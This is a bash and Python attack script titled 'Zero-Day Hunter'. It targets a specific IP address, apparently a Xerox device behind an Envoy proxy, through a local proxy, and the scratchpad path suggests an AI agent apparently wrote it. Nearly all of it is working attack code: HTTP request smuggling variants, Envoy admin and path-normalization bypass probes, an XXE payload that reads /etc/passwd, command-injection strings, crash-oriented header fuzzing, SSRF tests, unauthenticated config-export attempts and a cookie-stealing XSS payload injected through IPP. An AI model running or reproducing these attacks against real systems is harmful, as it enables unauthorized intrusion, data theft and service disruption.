#!/bin/bash
# Zero-Day Hunter for 13.13.1.112
# Targets ONLY novel vulnerabilities — no known CVEs, no burned reports
# Priority: Envoy-specific > Unauth RCE > Auth Bypass > Memory > SSRF > Logic > XSS

set +e
TARGET="13.13.1.112"
PROXY_HOST="127.0.0.1"
PROXY_PORT="32789"
OUTDIR="/tmp/claude-0/-home-user-poc/7cd1a7e6-f110-5076-9299-6360885c3a0d/scratchpad/112_zeroday"
mkdir -p "$OUTDIR"
LOGFILE="$OUTDIR/hunt_$(date +%Y%m%d_%H%M%S).log"

log() { echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOGFILE"; }
finding() { echo "" | tee -a "$LOGFILE"; echo "!!! FINDING: $1" | tee -a "$LOGFILE"; echo "" | tee -a "$LOGFILE"; }

send_https() {
    local path="$1"
    local method="${2:-GET}"
    local extra_headers="${3:-}"
    local body="${4:-}"
    local timeout="${5:-10}"

    python3 << PYEOF
import socket, ssl, sys, time
PROXY = ("$PROXY_HOST", $PROXY_PORT)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout($timeout)
    s.connect(PROXY)
    s.sendall(b"CONNECT $TARGET:443 HTTP/1.1\r\nHost: $TARGET:443\r\n\r\n")
    buf = b""
    while b"\r\n\r\n" not in buf:
        c = s.recv(4096)
        if not c: break
        buf += c
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(s, server_hostname="$TARGET")
    req = "$method $path HTTP/1.1\r\nHost: $TARGET\r\n"
    if """$extra_headers""":
        req += """$extra_headers"""
    if """$body""":
        req += "Content-Length: " + str(len("""$body""")) + "\r\n"
        req += "Content-Type: application/x-www-form-urlencoded\r\n"
    req += "Connection: close\r\n\r\n"
    if """$body""":
        req += """$body"""
    s.sendall(req.encode())
    time.sleep(1)
    s.settimeout(5)
    data = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            data += c
    except: pass
    s.close()
    print(data.decode('utf-8', errors='replace'))
except Exception as e:
    print(f"ERROR: {e}")
PYEOF
}

send_http() {
    local path="$1"
    local method="${2:-GET}"
    local extra_headers="${3:-}"
    local body="${4:-}"
    local timeout="${5:-10}"

    python3 << PYEOF
import socket, sys, time
PROXY = ("$PROXY_HOST", $PROXY_PORT)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout($timeout)
    s.connect(PROXY)
    s.sendall(b"CONNECT $TARGET:80 HTTP/1.1\r\nHost: $TARGET:80\r\n\r\n")
    buf = b""
    while b"\r\n\r\n" not in buf:
        c = s.recv(4096)
        if not c: break
        buf += c
    req = "$method $path HTTP/1.1\r\nHost: $TARGET\r\n"
    if """$extra_headers""":
        req += """$extra_headers"""
    if """$body""":
        req += "Content-Length: " + str(len("""$body""")) + "\r\n"
        req += "Content-Type: application/x-www-form-urlencoded\r\n"
    req += "Connection: close\r\n\r\n"
    if """$body""":
        req += """$body"""
    s.sendall(req.encode())
    time.sleep(1)
    s.settimeout(5)
    data = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            data += c
    except: pass
    s.close()
    print(data.decode('utf-8', errors='replace'))
except Exception as e:
    print(f"ERROR: {e}")
PYEOF
}

log "============================================"
log "ZERO-DAY HUNT: $TARGET"
log "============================================"

# ==========================================
# PHASE 0: Connectivity check
# ==========================================
log "PHASE 0: Connectivity"
HTTPS_UP=false
HTTP_UP=false

R443=$(send_https "/" "GET" "" "" 10 2>&1)
if echo "$R443" | grep -qiE "HTTP/1\.[01] [0-9]"; then
    HTTPS_UP=true
    log "HTTPS :443 — UP"
    echo "$R443" | head -20 >> "$LOGFILE"
else
    log "HTTPS :443 — DOWN ($R443)"
fi

R80=$(send_http "/" "GET" "" "" 10 2>&1)
if echo "$R80" | grep -qiE "HTTP/1\.[01] [0-9]"; then
    HTTP_UP=true
    log "HTTP :80 — UP"
    echo "$R80" | head -20 >> "$LOGFILE"
else
    log "HTTP :80 — DOWN ($R80)"
fi

if ! $HTTPS_UP && ! $HTTP_UP; then
    log "TARGET UNREACHABLE. Aborting."
    exit 1
fi

# ==========================================
# PHASE 1: ENVOY PROXY ATTACKS (Priority #1 — unique to .112)
# ==========================================
log ""
log "PHASE 1: ENVOY PROXY ATTACKS"
log "----------------------------"

# 1a. Envoy admin interface probing
log "1a. Probing Envoy admin endpoints..."
for admin_path in "/admin" "/stats" "/stats/prometheus" "/clusters" "/config_dump" "/certs" \
    "/server_info" "/ready" "/listeners" "/runtime" "/runtime_modify" "/drain_listeners" \
    "/healthcheck/fail" "/healthcheck/ok" "/hot_restart_version" "/memory" "/quitquitquit" \
    "/reset_counters" "/logging" "/.well-known/envoy"; do
    result=$(send_http "$admin_path" "GET" "" "" 8 2>&1)
    status=$(echo "$result" | head -1)
    if echo "$status" | grep -qiE "200|301|302|401|403"; then
        log "  $admin_path => $status"
        echo "$result" > "$OUTDIR/envoy_admin_$(echo $admin_path | tr '/' '_').txt"
        if echo "$status" | grep -q "200"; then
            finding "Envoy admin endpoint accessible: $admin_path"
        fi
    fi
done

# 1b. HTTP Request Smuggling through Envoy
log "1b. Testing HTTP Request Smuggling (CL.TE)..."
python3 << 'PYEOF' 2>&1 | tee -a "$LOGFILE"
import socket, ssl, time

PROXY = ("127.0.0.1", 32789)
TARGET = "13.13.1.112"
results = []

# CL.TE smuggling test
def test_smuggle(desc, raw_request):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect(PROXY)
        s.sendall(f"CONNECT {TARGET}:80 HTTP/1.1\r\nHost: {TARGET}:80\r\n\r\n".encode())
        buf = b""
        while b"\r\n\r\n" not in buf:
            c = s.recv(4096)
            if not c: break
            buf += c
        s.sendall(raw_request)
        time.sleep(3)
        s.settimeout(5)
        data = b""
        try:
            while True:
                c = s.recv(4096)
                if not c: break
                data += c
        except: pass
        s.close()
        return data
    except Exception as e:
        return str(e).encode()

# Test 1: CL.TE — Content-Length vs Transfer-Encoding disagreement
payload1 = (
    b"POST / HTTP/1.1\r\n"
    b"Host: " + TARGET.encode() + b"\r\n"
    b"Content-Length: 6\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    b"0\r\n\r\n"
    b"X"
)
r = test_smuggle("CL.TE basic", payload1)
status = r.split(b"\r\n")[0] if r else b""
print(f"  CL.TE basic: {status.decode('utf-8', errors='replace')}")

# Test 2: TE.CL
payload2 = (
    b"POST / HTTP/1.1\r\n"
    b"Host: " + TARGET.encode() + b"\r\n"
    b"Content-Length: 3\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    b"8\r\n"
    b"SMUGGLED\r\n"
    b"0\r\n\r\n"
)
r = test_smuggle("TE.CL basic", payload2)
status = r.split(b"\r\n")[0] if r else b""
print(f"  TE.CL basic: {status.decode('utf-8', errors='replace')}")

# Test 3: TE obfuscation variants
for te_header in [
    b"Transfer-Encoding: xchunked",
    b"Transfer-Encoding : chunked",
    b"Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
    b"Transfer-encoding: chunked",
    b"Transfer-Encoding:\tchunked",
    b"X: x\r\nTransfer-Encoding: chunked",
]:
    payload = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + TARGET.encode() + b"\r\n"
        b"Content-Length: 6\r\n" +
        te_header + b"\r\n"
        b"\r\n"
        b"0\r\n\r\n"
        b"X"
    )
    r = test_smuggle(f"TE obfuscation", payload)
    status = r.split(b"\r\n")[0] if r else b""
    te_name = te_header.decode('utf-8', errors='replace').strip()
    print(f"  TE variant [{te_name}]: {status.decode('utf-8', errors='replace')}")

# Test 4: H2C upgrade smuggling
payload_h2c = (
    b"GET / HTTP/1.1\r\n"
    b"Host: " + TARGET.encode() + b"\r\n"
    b"Upgrade: h2c\r\n"
    b"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n"
    b"Connection: Upgrade, HTTP2-Settings\r\n"
    b"\r\n"
)
r = test_smuggle("H2C upgrade", payload_h2c)
status = r.split(b"\r\n")[0] if r else b""
print(f"  H2C upgrade: {status.decode('utf-8', errors='replace')}")
if b"101" in status or b"Switching" in r:
    print("  !!! FINDING: H2C upgrade accepted — potential smuggling vector")

# Test 5: WebSocket upgrade
payload_ws = (
    b"GET / HTTP/1.1\r\n"
    b"Host: " + TARGET.encode() + b"\r\n"
    b"Upgrade: websocket\r\n"
    b"Connection: Upgrade\r\n"
    b"Sec-WebSocket-Version: 13\r\n"
    b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
    b"\r\n"
)
r = test_smuggle("WebSocket upgrade", payload_ws)
status = r.split(b"\r\n")[0] if r else b""
print(f"  WebSocket upgrade: {status.decode('utf-8', errors='replace')}")
if b"101" in status:
    print("  !!! FINDING: WebSocket upgrade accepted")

PYEOF

# 1c. Envoy path normalization bypass
log "1c. Path normalization bypass attempts..."
for bypass_path in \
    "/admin" "/Admin" "/ADMIN" \
    "//admin" "/./admin" "/../admin" \
    "/admin..;/" "/admin%00" "/admin%20" \
    "/admin%2e%2e/" "/admin;/" \
    "/%61%64%6d%69%6e" \
    "/stat/welcome.php" "/stat/welcome.php/" \
    "/stat/welcome.php%00" "/stat/welcome.php;.css" \
    "/stat/welcome.php/..;/admin" \
    "/properties/authentication/luidLogin.php" \
    "/properties/authentication/luidLogin.php;.js" \
    "/webglue/rawcontent" "/webglue/rawcontent;.css"; do
    result=$(send_https "$bypass_path" "GET" "" "" 8 2>&1)
    status=$(echo "$result" | head -1)
    if echo "$status" | grep -qiE "200 OK"; then
        size=$(echo "$result" | wc -c)
        log "  $bypass_path => $status ($size bytes)"
        echo "$result" > "$OUTDIR/bypass_$(echo $bypass_path | tr '/' '_' | tr ';' '_').txt"
    fi
done

# ==========================================
# PHASE 2: UNAUTH RCE HUNTING
# ==========================================
log ""
log "PHASE 2: UNAUTHENTICATED RCE HUNTING"
log "-------------------------------------"

# 2a. Undocumented CGI/endpoint discovery (beyond known xerox.set)
log "2a. Hunting undocumented endpoints..."
NOVEL_PATHS=(
    "/cgi-bin/status" "/cgi-bin/config" "/cgi-bin/firmware"
    "/cgi-bin/debug" "/cgi-bin/diag" "/cgi-bin/test"
    "/cgi-bin/upgrade" "/cgi-bin/upload" "/cgi-bin/exec"
    "/debug" "/debug.php" "/diag.php" "/test.php"
    "/api/v1/" "/api/v2/" "/api/config" "/api/system"
    "/webapi/" "/webapi/config" "/webapi/system"
    "/ws/" "/ws/config" "/ws/system"
    "/servlet/" "/servlet/config"
    "/cmd" "/command" "/exec" "/shell"
    "/firmware/upload" "/firmware/update" "/firmware/check"
    "/update" "/upgrade" "/flash"
    "/backup" "/restore" "/export" "/import"
    "/log" "/logs" "/syslog" "/eventlog"
    "/snmp" "/snmpconfig" "/snmpset"
    "/cert" "/certificate" "/certs" "/ca"
    "/ssh" "/sshconfig" "/telnet" "/telnetconfig"
    "/fax" "/faxconfig" "/scan" "/scanconfig"
    "/clone" "/cloneconfig" "/configclone"
    "/webservices" "/wsd" "/ws-discovery"
    "/ipp" "/ipp/print" "/ipp/printers"
    "/stat/" "/stat/deviceStatus.php"
    "/stat/printUsage.php" "/stat/faxUsage.php"
    "/stat/copyUsage.php" "/stat/scanUsage.php"
    "/properties/" "/properties/device/"
    "/properties/security/" "/properties/network/"
    "/properties/connectivity/"
    "/dummypost/" "/dummypost/debug.set"
    "/dummypost/firmware.set" "/dummypost/system.set"
    "/dummypost/network.set" "/dummypost/security.set"
    "/saml" "/saml/acs" "/saml/metadata"
    "/oauth" "/oauth/callback" "/oauth/token"
    "/.env" "/.git/config" "/.htaccess"
    "/server-status" "/server-info"
    "/phpinfo.php" "/info.php" "/test.cgi"
    "/webglue/rawcontent?%DIFFDEVICEID%"
    "/webglue/rawcontent?Command=ExportCloneFile"
)

for path in "${NOVEL_PATHS[@]}"; do
    result=$(send_https "$path" "GET" "" "" 8 2>&1)
    status=$(echo "$result" | head -1)
    if echo "$status" | grep -qiE "200 OK|301 |302 |401 |405 "; then
        size=$(echo "$result" | wc -c)
        log "  $path => $status ($size bytes)"
        echo "$result" > "$OUTDIR/endpoint_$(echo $path | tr '/' '_' | tr '?' '_').txt"
        if echo "$status" | grep -q "200"; then
            # Check if it returns meaningful content (not just a redirect page)
            if [ $size -gt 500 ]; then
                finding "Novel endpoint with content: $path ($size bytes)"
            fi
        fi
    fi
done

# 2b. SOAP/XML service injection
log "2b. SOAP/XML service injection tests..."
SOAP_ENDPOINTS=("/webservices/office/wsdl" "/webservices/office/xeroxConfig"
    "/webservices" "/ws/scan" "/ws/print" "/ws/fax")

for ep in "${SOAP_ENDPOINTS[@]}"; do
    # First try GET to discover WSDL
    result=$(send_https "$ep" "GET" "" "" 8 2>&1)
    status=$(echo "$result" | head -1)
    if echo "$status" | grep -qiE "200|405"; then
        log "  SOAP endpoint found: $ep => $status"
        echo "$result" > "$OUTDIR/soap_$(echo $ep | tr '/' '_').txt"

        # Try XXE via SOAP
        xxe_payload='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>'
        result2=$(send_https "$ep" "POST" "Content-Type: text/xml\r\nSOAPAction: test\r\n" "$xxe_payload" 10 2>&1)
        if echo "$result2" | grep -qiE "root:|nobody:|daemon:"; then
            finding "XXE via SOAP at $ep — /etc/passwd readable!"
        fi
        echo "$result2" > "$OUTDIR/soap_xxe_$(echo $ep | tr '/' '_').txt"
    fi
done

# 2c. Command injection in novel parameters
log "2c. Command injection probing..."
CMDI_PAYLOADS=(
    ';id'
    '|id'
    '$(id)'
    '`id`'
    '%0aid'
    '||id'
    '&&id'
    ';cat /etc/passwd'
    '|cat${IFS}/etc/passwd'
)

# Test command injection in HTTP headers
for payload in "${CMDI_PAYLOADS[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
    # Test in Host header
    result=$(send_https "/" "GET" "X-Forwarded-For: 127.0.0.1${payload}\r\n" "" 8 2>&1)
    if echo "$result" | grep -qiE "uid=|root:|nobody:"; then
        finding "Command injection via X-Forwarded-For header with payload: $payload"
    fi
done

# ==========================================
# PHASE 3: AUTHENTICATION BYPASS
# ==========================================
log ""
log "PHASE 3: AUTHENTICATION BYPASS"
log "-------------------------------"

# 3a. Path traversal auth bypass
log "3a. Path traversal auth bypass..."
AUTH_BYPASSES=(
    "/properties/authentication/luidLogin.php/../../admin/"
    "/stat/welcome.php/../../properties/authentication/"
    "/stat/../properties/authentication/luidLogin.php"
    "/%2e%2e/%2e%2e/admin"
    "/..;/admin"
    "/admin/..;/admin"
    "/properties/authentication/luidLogin.php%23"
    "/properties/authentication/luidLogin.php%3f"
)

for path in "${AUTH_BYPASSES[@]}"; do
    result=$(send_https "$path" "GET" "" "" 8 2>&1)
    status=$(echo "$result" | head -1)
    body_size=$(echo "$result" | wc -c)
    log "  $path => $status ($body_size bytes)"
    if echo "$status" | grep -q "200"; then
        if echo "$result" | grep -qiE "admin|password|configuration|security"; then
            finding "Auth bypass via path traversal: $path"
            echo "$result" > "$OUTDIR/authbypass_$(echo $path | tr '/' '_').txt"
        fi
    fi
done

# 3b. HTTP verb tampering for auth bypass
log "3b. HTTP verb tampering..."
for method in "PUT" "PATCH" "DELETE" "OPTIONS" "TRACE" "PROPFIND" "MOVE" "COPY"; do
    result=$(send_https "/properties/authentication/luidLogin.php" "$method" "" "" 8 2>&1)
    status=$(echo "$result" | head -1)
    log "  $method /luidLogin.php => $status"
    if echo "$result" | grep -qiE "admin|password|config" && ! echo "$status" | grep -q "405"; then
        finding "Verb tampering bypass with $method on admin endpoint"
    fi
done

# 3c. Session/cookie analysis
log "3c. Session token analysis..."
result=$(send_https "/stat/welcome.php" "GET" "" "" 10 2>&1)
cookies=$(echo "$result" | grep -i "Set-Cookie")
if [ -n "$cookies" ]; then
    log "  Cookies found:"
    echo "$cookies" | tee -a "$LOGFILE"
    # Check for weak session tokens
    session_val=$(echo "$cookies" | grep -oP 'PHPSESSID=[^;]+' | head -1)
    if [ -n "$session_val" ]; then
        log "  PHP Session: $session_val"
        # Get a second session to compare predictability
        result2=$(send_https "/stat/welcome.php" "GET" "" "" 10 2>&1)
        session_val2=$(echo "$result2" | grep -oP 'PHPSESSID=[^;]+' | head -1)
        log "  PHP Session 2: $session_val2"
    fi
fi

# ==========================================
# PHASE 4: MEMORY CORRUPTION
# ==========================================
log ""
log "PHASE 4: MEMORY CORRUPTION"
log "--------------------------"

# 4a. Oversized headers
log "4a. Oversized header fuzzing..."
python3 << 'PYEOF' 2>&1 | tee -a "$LOGFILE"
import socket, ssl, time

PROXY = ("127.0.0.1", 32789)
TARGET = "13.13.1.112"

def send_raw_https(raw_request, timeout=10):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(PROXY)
        s.sendall(f"CONNECT {TARGET}:443 HTTP/1.1\r\nHost: {TARGET}:443\r\n\r\n".encode())
        buf = b""
        while b"\r\n\r\n" not in buf:
            c = s.recv(4096)
            if not c: break
            buf += c
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=TARGET)
        s.sendall(raw_request)
        time.sleep(1)
        s.settimeout(5)
        data = b""
        try:
            while True:
                c = s.recv(4096)
                if not c: break
                data += c
        except: pass
        s.close()
        return data
    except Exception as e:
        return str(e).encode()

# Test oversized Host header
for size in [256, 512, 1024, 2048, 4096, 8192]:
    payload = f"GET / HTTP/1.1\r\nHost: {'A' * size}\r\nConnection: close\r\n\r\n".encode()
    r = send_raw_https(payload)
    status = r.split(b"\r\n")[0].decode('utf-8', errors='replace') if r else "no response"
    print(f"  Host header {size} chars: {status}")
    if b"" == r or b"500" in r.split(b"\r\n")[0] or b"segfault" in r.lower():
        print(f"  !!! POTENTIAL CRASH with {size}-char Host header")

# Test oversized Cookie
for size in [256, 512, 1024, 4096, 8192, 16384]:
    payload = f"GET / HTTP/1.1\r\nHost: {TARGET}\r\nCookie: session={'B' * size}\r\nConnection: close\r\n\r\n".encode()
    r = send_raw_https(payload)
    status = r.split(b"\r\n")[0].decode('utf-8', errors='replace') if r else "no response"
    print(f"  Cookie {size} chars: {status}")

# Test oversized URL path
for size in [256, 512, 1024, 2048, 4096, 8192]:
    payload = f"GET /{'C' * size} HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n".encode()
    r = send_raw_https(payload)
    status = r.split(b"\r\n")[0].decode('utf-8', errors='replace') if r else "no response"
    print(f"  URL path {size} chars: {status}")

# Test integer overflow in Content-Length
for cl_val in ["0", "-1", "4294967295", "4294967296", "99999999999", "0x100"]:
    payload = f"POST / HTTP/1.1\r\nHost: {TARGET}\r\nContent-Length: {cl_val}\r\nConnection: close\r\n\r\nAAAA".encode()
    r = send_raw_https(payload, timeout=8)
    status = r.split(b"\r\n")[0].decode('utf-8', errors='replace') if r else "no response"
    print(f"  Content-Length={cl_val}: {status}")

# Test malformed chunked encoding
for chunk_payload in [
    b"POST / HTTP/1.1\r\nHost: " + TARGET.encode() + b"\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\nFFFFFFFF\r\nAAAA\r\n0\r\n\r\n",
    b"POST / HTTP/1.1\r\nHost: " + TARGET.encode() + b"\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n-1\r\nAAAA\r\n0\r\n\r\n",
]:
    r = send_raw_https(chunk_payload, timeout=8)
    status = r.split(b"\r\n")[0].decode('utf-8', errors='replace') if r else "no response"
    print(f"  Malformed chunk: {status}")

PYEOF

# ==========================================
# PHASE 5: SSRF HUNTING
# ==========================================
log ""
log "PHASE 5: SSRF HUNTING"
log "---------------------"

# 5a. Firmware update URL manipulation
log "5a. Testing firmware/config URL parameters..."
SSRF_ENDPOINTS=(
    "/dummypost/xerox.set"
    "/webglue/rawcontent"
    "/properties/connectivity/"
)

for ep in "${SSRF_ENDPOINTS[@]}"; do
    # Test URL-type parameters that might trigger server-side fetch
    for param in "url" "server" "host" "address" "ldapServer" "smbServer" \
        "ftpServer" "smtpServer" "ntpServer" "dnsServer" "proxyServer" \
        "firmwareUrl" "updateUrl" "importUrl"; do
        result=$(send_https "$ep" "POST" "" "${param}=http://127.0.0.1:80/" 8 2>&1)
        status=$(echo "$result" | head -1)
        if echo "$status" | grep -qiE "200|302" && ! echo "$result" | grep -qiE "invalid|error|denied"; then
            log "  $ep with $param => $status (might accept URL)"
        fi
    done
done

# ==========================================
# PHASE 6: BUSINESS LOGIC
# ==========================================
log ""
log "PHASE 6: BUSINESS LOGIC FLAWS"
log "-----------------------------"

# 6a. Config clone/export without auth
log "6a. Config export attempts..."
CLONE_PATHS=(
    "/webglue/rawcontent?Command=ExportCloneFile"
    "/webglue/rawcontent?Command=GetCloneFile"
    "/properties/configuration/exportConfig.php"
    "/properties/configuration/backupConfig.php"
    "/backup.dlm" "/config.dlm" "/clone.dlm"
    "/properties/configuration/cloneExport.php"
    "/webglue/rawcontent?%DIFFDEVICEID%"
    "/webglue/rawcontent?Command=GetDeviceConfig"
)

for path in "${CLONE_PATHS[@]}"; do
    result=$(send_https "$path" "GET" "" "" 10 2>&1)
    status=$(echo "$result" | head -1)
    size=$(echo "$result" | wc -c)
    if echo "$status" | grep -qiE "200 OK" && [ $size -gt 1000 ]; then
        finding "Config export accessible without auth: $path ($size bytes)"
        echo "$result" > "$OUTDIR/config_export_$(echo $path | tr '/' '_' | tr '?' '_').txt"
    fi
done

# 6b. Certificate/TLS management without auth
log "6b. Certificate management..."
CERT_PATHS=(
    "/properties/security/certificates.php"
    "/properties/security/sslConfig.php"
    "/properties/security/802.1x.php"
    "/certs/ca" "/certs/device"
    "/properties/security/ipsec.php"
)

for path in "${CERT_PATHS[@]}"; do
    result=$(send_https "$path" "GET" "" "" 8 2>&1)
    status=$(echo "$result" | head -1)
    if echo "$status" | grep -qiE "200 OK"; then
        if echo "$result" | grep -qiE "certificate|private|key|ssl|tls"; then
            finding "Certificate management accessible: $path"
        fi
    fi
done

# ==========================================
# PHASE 7: NOVEL XSS (only non-CVE vectors)
# ==========================================
log ""
log "PHASE 7: NOVEL XSS VECTORS"
log "--------------------------"

# 7a. XSS via print job name (inject via IPP)
log "7a. Testing XSS via IPP job attributes..."
python3 << 'PYEOF' 2>&1 | tee -a "$LOGFILE"
import socket, ssl, struct, time

PROXY = ("127.0.0.1", 32789)
TARGET = "13.13.1.112"

# Build IPP request with XSS in job-name
def build_ipp_request():
    # IPP version 1.1, operation Print-Job (0x0002)
    data = struct.pack(">HHI", 0x0101, 0x0002, 1)  # version, op, request-id

    # Operation attributes
    data += bytes([0x01])  # operation-attributes-tag

    # charset
    data += struct.pack(">BH", 0x47, 18) + b"attributes-charset"
    data += struct.pack(">H", 5) + b"utf-8"

    # natural-language
    data += struct.pack(">BH", 0x48, 27) + b"attributes-natural-language"
    data += struct.pack(">H", 5) + b"en-us"

    # printer-uri
    data += struct.pack(">BH", 0x45, 11) + b"printer-uri"
    uri = f"ipp://{TARGET}/ipp/print"
    data += struct.pack(">H", len(uri)) + uri.encode()

    # Job attributes
    data += bytes([0x02])  # job-attributes-tag

    # job-name with XSS payload
    xss = '<script>alert(document.cookie)</script>'
    data += struct.pack(">BH", 0x42, 8) + b"job-name"
    data += struct.pack(">H", len(xss)) + xss.encode()

    data += bytes([0x03])  # end-of-attributes

    # Minimal document data
    data += b"%!PS\nshowpage\n"

    return data

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect(PROXY)
    s.sendall(f"CONNECT {TARGET}:631 HTTP/1.1\r\nHost: {TARGET}:631\r\n\r\n".encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        c = s.recv(4096)
        if not c: break
        buf += c

    ipp_data = build_ipp_request()
    http_req = (
        f"POST /ipp/print HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Content-Type: application/ipp\r\n"
        f"Content-Length: {len(ipp_data)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + ipp_data

    s.sendall(http_req)
    time.sleep(2)
    s.settimeout(5)
    data = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            data += c
    except: pass
    s.close()

    if data:
        status = data.split(b"\r\n")[0].decode('utf-8', errors='replace')
        print(f"  IPP XSS injection: {status}")
        if b"successful" in data.lower() or b"\x00\x00" in data[:8]:
            print("  IPP request accepted — check job list for reflected XSS")
    else:
        print("  IPP: no response")
except Exception as e:
    print(f"  IPP error: {e}")

PYEOF

# 7b. XSS via SNMP (if writable)
log "7b. Testing SNMP write for stored XSS..."
python3 << 'PYEOF' 2>&1 | tee -a "$LOGFILE"
import socket, time

PROXY = ("127.0.0.1", 32789)
TARGET = "13.13.1.112"

# SNMP GET for sysDescr (read-only probe first)
# OID 1.3.6.1.2.1.1.1.0 (sysDescr)
snmp_get = bytes([
    0x30, 0x29,  # SEQUENCE
    0x02, 0x01, 0x00,  # version: v1
    0x04, 0x06, 0x70, 0x75, 0x62, 0x6c, 0x69, 0x63,  # community: public
    0xa0, 0x1c,  # GetRequest
    0x02, 0x04, 0x00, 0x00, 0x00, 0x01,  # request-id
    0x02, 0x01, 0x00,  # error-status
    0x02, 0x01, 0x00,  # error-index
    0x30, 0x0e,  # varbind list
    0x30, 0x0c,  # varbind
    0x06, 0x08, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00,  # OID
    0x05, 0x00   # NULL value
])

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect(PROXY)
    s.sendall(f"CONNECT {TARGET}:161 HTTP/1.1\r\nHost: {TARGET}:161\r\n\r\n".encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        c = s.recv(4096)
        if not c: break
        buf += c
    # Note: SNMP is UDP but we're tunneling TCP — this may not work through proxy
    s.sendall(snmp_get)
    time.sleep(2)
    s.settimeout(3)
    data = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            data += c
    except: pass
    s.close()
    if data and len(data) > 10:
        print(f"  SNMP response: {len(data)} bytes — {data[:50].hex()}")
    else:
        print(f"  SNMP: no response (UDP over TCP tunnel likely unsupported)")
except Exception as e:
    print(f"  SNMP error: {e}")
PYEOF

# ==========================================
# SUMMARY
# ==========================================
log ""
log "============================================"
log "HUNT COMPLETE"
log "============================================"
log "Results saved to: $OUTDIR"
log "Log file: $LOGFILE"

# Count findings
FINDING_COUNT=$(grep -c "!!! FINDING:" "$LOGFILE" 2>/dev/null || echo 0)
log "Total novel findings: $FINDING_COUNT"

if [ "$FINDING_COUNT" -gt 0 ]; then
    log ""
    log "FINDINGS SUMMARY:"
    grep "!!! FINDING:" "$LOGFILE"
fi
